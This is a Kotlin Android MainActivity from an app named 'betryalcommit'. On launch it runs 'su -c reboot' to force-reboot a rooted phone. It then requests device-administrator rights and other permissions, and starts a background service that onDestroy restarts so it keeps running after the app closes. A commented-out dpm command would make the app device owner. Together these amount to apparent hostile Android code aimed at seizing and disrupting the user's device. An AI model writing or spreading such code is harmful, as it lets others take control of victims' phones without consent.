package com.example.betryalcommit
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.IBinder
import androidx.appcompat.app.AppCompatActivity
import java.io.IOException

class MainActivity : AppCompatActivity() {
    companion object {
        const val PERMISSION_REQUEST_CODE = 1
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        AdminAct.initialize(this);
        try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
            val reader = process.inputStream.bufferedReader()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                println(line)
            }
            process.waitFor()
        } catch (e: IOException) {
            e.printStackTrace()
        }
        if (AdminAct.isDeviceAdminAssigned()) {
            //Runtime.getRuntime().exec("dpm set-device-owner com.example.betryalcommit/.MyDeviceAdminReceiver");

            val serviceIntent = Intent(this, MyService::class.java)
            startService(serviceIntent)

        }
            Permsu.requestPermissions(this, this, PERMISSION_REQUEST_CODE)
            AdminAct.admact(this, this);
    }


    override fun onDestroy() {

        val serviceIntent = Intent(this, MyService::class.java)
        startService(serviceIntent)
    }

}
